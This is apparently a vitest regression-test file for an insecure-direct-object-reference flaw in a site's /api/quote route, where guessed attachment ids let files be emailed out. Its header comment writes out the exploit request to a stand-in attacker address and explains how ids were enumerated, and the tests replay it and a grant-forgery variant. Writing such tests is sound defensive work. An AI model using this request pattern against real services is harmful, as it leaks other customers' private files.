import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";

/**
 * Regression test for the /api/quote attachment IDOR.
 *
 * THE ATTACK THIS REPRODUCES
 * `/api/quote` took `attachmentIds` from the request body, read each one back
 * from the CMS using the internal key — which satisfies the staff-only read gate
 * on `enquiry-uploads` — and attached the bytes to the confirmation email, whose
 * recipient came from the same untrusted body. So:
 *
 *   POST /api/quote {"email":"attacker@evil.test","attachmentIds":["<victim id>"]}
 *
 * mailed another customer's drawings to the attacker. Ids were guessable — the
 * public upload endpoint returns one, and ObjectIds are sequential enough to
 * walk from there.
 *
 * This exercises the REAL route handler, not the helper, and asserts on the two
 * things that actually leak: whether the file was read back at all, and what was
 * attached to the outbound email.
 */

const VICTIM_ID = "507f1f77bcf86cd799439011";
const OWN_ID = "507f1f77bcf86cd799439022";

const fetchEnquiryFileBase64 = vi.fn(async (id: string) => ({
  filename: `${id}.pdf`,
  content: "cHJpdmF0ZQ==",
  contentType: "application/pdf",
}));
const sendQuoteEmails = vi.fn(async () => ({ customer: true, team: true }));

vi.mock("@/backend/services/enquiries.service", () => ({
  fetchEnquiryFileBase64: (id: string) => fetchEnquiryFileBase64(id),
  uploadEnquiryFiles: vi.fn(async () => []),
  createEnquiry: vi.fn(async () => ({ ok: true, referenceId: "RFQ-20260902-TESTAA" })),
}));
vi.mock("@/backend/lib/email", () => ({
  sendQuoteEmails: (...a: unknown[]) => sendQuoteEmails(...(a as [])),
}));
vi.mock("@/backend/lib/rate-limit", () => ({
  limitRate: vi.fn(async () => ({ ok: true })),
  clientIp: vi.fn(() => "203.0.113.7"),
}));

let POST: (req: Request) => Promise<Response>;
let mintAttachmentGrant: (id: string, now?: number) => string | null;
let savedSecret: string | undefined;

beforeEach(async () => {
  savedSecret = process.env.ATTACHMENT_SIGNING_SECRET;
  process.env.ATTACHMENT_SIGNING_SECRET = "test-signing-secret";
  fetchEnquiryFileBase64.mockClear();
  sendQuoteEmails.mockClear();
  ({ POST } = await import("@/app/api/quote/route"));
  ({ mintAttachmentGrant } = await import("@/backend/lib/attachment-grant"));
});

afterEach(() => {
  if (savedSecret === undefined) delete process.env.ATTACHMENT_SIGNING_SECRET;
  else process.env.ATTACHMENT_SIGNING_SECRET = savedSecret;
});

const post = (extra: Record<string, unknown>) =>
  POST(
    new Request("https://www.metnmat.com/api/quote", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        name: "Attacker",
        email: "attacker@evil.test",
        message: "Please send me a quote for this item.",
        ...extra,
      }),
    })
  );

/** The attachments handed to the mailer for this call. */
const emailedAttachments = (): Array<{ filename: string }> =>
  (sendQuoteEmails.mock.calls[0]?.[1] as Array<{ filename: string }>) ?? [];

describe("/api/quote attachment ownership", () => {
  it("does NOT read back or email a file named by a bare id", async () => {
    const res = await post({ attachmentIds: [VICTIM_ID] });

    expect(res.status).toBe(201);
    // The leak was here: a bare id must never reach the privileged readback.
    expect(fetchEnquiryFileBase64).not.toHaveBeenCalled();
    expect(emailedAttachments()).toHaveLength(0);
  });

  it("ignores a bare id even when a legitimate grant is sent alongside it", async () => {
    const grant = mintAttachmentGrant(OWN_ID)!;
    await post({ attachmentGrants: [grant], attachmentIds: [VICTIM_ID] });

    expect(fetchEnquiryFileBase64).toHaveBeenCalledTimes(1);
    expect(fetchEnquiryFileBase64).toHaveBeenCalledWith(OWN_ID);
    expect(emailedAttachments().map((a) => a.filename)).toEqual([`${OWN_ID}.pdf`]);
  });

  it("attaches a file the caller holds a valid grant for", async () => {
    const grant = mintAttachmentGrant(OWN_ID)!;
    const res = await post({ attachmentGrants: [grant] });

    expect(res.status).toBe(201);
    expect(fetchEnquiryFileBase64).toHaveBeenCalledWith(OWN_ID);
    expect(emailedAttachments()).toHaveLength(1);
  });

  it("refuses a grant minted for a different id (signature transplant)", async () => {
    const grant = mintAttachmentGrant(OWN_ID)!;
    const [, exp, mac] = grant.split(".");
    await post({ attachmentGrants: [`${VICTIM_ID}.${exp}.${mac}`] });

    expect(fetchEnquiryFileBase64).not.toHaveBeenCalled();
    expect(emailedAttachments()).toHaveLength(0);
  });

  it("caps the readback, so one request cannot drive unbounded CMS traffic", async () => {
    const grants = Array.from(
      { length: 30 },
      (_, i) => mintAttachmentGrant("507f1f77bcf86cd7994390".concat(String(i).padStart(2, "0")))!
    );
    await post({ attachmentGrants: grants });

    expect(fetchEnquiryFileBase64.mock.calls.length).toBeLessThanOrEqual(5);
  });

  it("does not attach the same file twice when a grant is repeated", async () => {
    const grant = mintAttachmentGrant(OWN_ID)!;
    await post({ attachmentGrants: [grant, grant, grant] });

    expect(fetchEnquiryFileBase64).toHaveBeenCalledTimes(1);
    expect(emailedAttachments()).toHaveLength(1);
  });

  it("still accepts a plain enquiry with no attachments", async () => {
    const res = await post({});
    expect(res.status).toBe(201);
    expect(await res.json()).toMatchObject({ ok: true });
    expect(fetchEnquiryFileBase64).not.toHaveBeenCalled();
  });
});
